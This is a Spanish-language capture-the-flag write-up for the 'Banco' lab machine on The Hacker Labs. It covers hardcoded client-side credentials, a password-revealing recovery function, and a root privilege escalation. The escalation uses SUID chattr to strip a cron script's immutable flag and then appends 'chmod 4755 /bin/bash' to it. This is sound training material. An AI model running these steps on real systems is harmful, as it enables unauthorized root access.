## Info

![Banco](/assets/posts/2026-08-07-banco-machines-thl/01_banco.png)
*Banco - The Hacker Labs (Easy)*

Banco es una máquina de dificultad Easy de **The Hacker Labs**.

> La Cyber Kill Chain comienza con **fingerprinting** hacia una webapp donde se descubre un endpoint vulnerable a **LFI**, seguido de la enumeración de dos usuarios válidos del sistema mediante dicho LFI, así como de un archivo `.json` que contiene contraseñas en texto plano válidas para autenticarse por **SSH**, y finaliza con una escalada de privilegios abusando de un **cronjob** ejecutado por root cada minuto, aprovechando los binarios `lsattr` y `chattr` con SUID para retirar el atributo inmutable de un script y forzar la creación de una bash SUID como `root`.
{: .prompt-info }

## Análisis de código fuente

En el código fuente se presentan varios hallazgos interesantes.

### Credenciales hardcodeadas en la función doLogin

```javascript
let currentPassword = 'DNASdada11THL';

function doLogin() {
    const user = document.getElementById('username').value;
    const pass = document.getElementById('password').value;
    const errorDiv = document.getElementById('loginError');

    if (user === 'admin' && pass === currentPassword) {
        document.getElementById('loginOverlay').style.display = 'none';
        document.getElementById('mainContent').style.display = 'block';
    } else {
        errorDiv.style.display = 'block';
        errorDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Credenciales incorrectas. Acceso denegado.';
        setTimeout(() => {
            errorDiv.style.display = 'none';
        }, 3000);
    }
}
```

> Validar credenciales en el lado del cliente es una mala práctica crítica: cualquier persona con acceso al código fuente de la página puede leer la contraseña en texto plano, tal como ocurre aquí con `admin:DNASdada11THL`.
{: .prompt-danger }

### Information disclosure en la función checkForgot

```javascript
function checkForgot() {
    const user = document.getElementById('forgotUser').value.trim();
    const msgDiv = document.getElementById('simpleMsg');

    if (user === 'admin') {
        // No muestra mensaje de error, solo el formulario
        msgDiv.style.display = 'none';
        document.getElementById('currentPassSpan').textContent = currentPassword;
        document.getElementById('changePassDiv').style.display = 'block';
        document.getElementById('newPass').value = '';
        document.getElementById('confirmNewPass').value = '';
        document.getElementById('updateResult').style.display = 'none';
    }
    else {
        // Para cualquier otro usuario: solo mensaje simple

        msgDiv.innerHTML = `user ${user} not found`;
        document.getElementById('changePassDiv').style.display = 'none';
    }
}
```

Cuando se intenta recuperar la contraseña de un usuario no válido, la función muestra que el usuario no ha sido encontrado. Sin embargo, si se ingresa un usuario válido (como `admin`), entonces se muestra la contraseña vista anteriormente, además de campos adicionales para renovarla.

### Cron Jobs

Utilizo este pequeño script llamado `procmon.sh` para observar los procesos lanzados por cron en el sistema.

```shell
#!/bin/bash

function ctrl_c(){
	echo -e "\n\n[!] Exiting...\n"
	tput cnorm; exit 1
}

trap ctrl_c SIGINT

old_process="$(ps -eo command)"

while true; do
	new_process="$(ps -eo command)"
	diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>] | grep -vE 'procmon|command|kworker'
	old_process="$new_process"
done
```

### backup.sh

Reviso el propietario y los permisos del script.

```shell
ls -la /usr/local/bin/backup.sh

-rwxrwxrwx 1 root root 429 jun  7 12:32 /usr/local/bin/backup.sh
```

Su contenido es el siguiente:

```shell
#!/bin/bash
# backup.sh - Script para respaldar db.json

BACKUP_DIR="/var/backups"
SOURCE_FILE="/var/www/html/db.json"
DEST_FILE="$BACKUP_DIR/db_backup_$(date +'%Y%m%d_%H%M%S').json"
LOG_FILE="/var/log/backup.log"

mkdir -p "$BACKUP_DIR"

cp "$SOURCE_FILE" "$DEST_FILE" 2>/dev/null

echo "$(date) - Backup creado: $DEST_FILE" >> "$LOG_FILE"

ls -t $BACKUP_DIR/db_backup_*.json 2>/dev/null | tail -n +11 | xargs rm -f 2>/dev/null
```

Los permisos son `777`, por lo que para "otros usuarios" el archivo es totalmente escribible. Aprovecho esto para intentar añadir una instrucción maliciosa.

```shell
echo 'chmod 4755 /bin/bash' >> /usr/local/bin/backup.sh 

-bash: /usr/local/bin/backup.sh: Operación no permitida
```

Extraño, muy extraño... A pesar de tener permisos de escritura, la operación es rechazada. Reviso los atributos extendidos del archivo.

```shell
lsattr /usr/local/bin/backup.sh

----i---------e------- backup.sh
```

> Más información sobre `lsattr` y `chattr`: [lsattr](https://cmdbox.mikihands.com/es/lsattr/) / [chattr](https://cmdbox.mikihands.com/es/chattr/)
{: .prompt-tip }

El archivo tiene configurado el atributo **inmutable** (`i`), y esta es la razón por la cual, incluso teniendo permisos de escritura a nivel de sistema de archivos, no puedo modificarlo.

Recuerdo entonces que los binarios `chattr` y `lsattr` están configurados como SUID, por lo que puedo aprovechar los privilegios de su propietario (`root`) para retirar el atributo inmutable del script.

```shell
chattr -i /usr/local/bin/backup.sh
lsattr /usr/local/bin/backup.sh

--------------e------- backup.sh
```

Ahora sí puedo modificar el archivo.

```shell
echo 'chmod 4755 /bin/bash' >> /usr/local/bin/backup.sh
tail -1 /usr/local/bin/backup.sh

chmod 4755 /bin/bash
```

Con esto, cuando el cronjob ejecute el script como `root`, convertirá `/bin/bash` en un binario SUID, permitiéndome ejecutar una bash con sus privilegios.

```shell
ls -l /bin/bash

-rwxr-xr-x 1 root root 1265648 sep  7  2025 /bin/bash
```

Después de un momento, la bash es SUID.

```shell
ls -l /bin/bash

-rwsr-xr-x 1 root root 1265648 sep  7  2025 /bin/bash
```
